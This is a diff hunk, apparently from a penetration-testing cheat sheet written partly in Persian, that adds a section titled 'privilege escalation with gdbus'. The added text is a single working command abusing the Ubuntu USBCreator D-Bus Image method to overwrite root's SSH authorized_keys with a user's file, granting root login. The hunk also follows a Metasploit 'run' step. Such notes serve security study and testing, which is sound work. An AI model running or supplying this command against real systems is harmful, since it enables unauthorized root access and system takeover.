@@ -456,6 +456,11 @@ SECOND:
 4. in msf exec `run`
 ```
 
+### ارتقا دسترسی با gdbus
+
+```text
+gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/authorized_keys /root/.ssh/authorized_keys true
+```
 
 
 
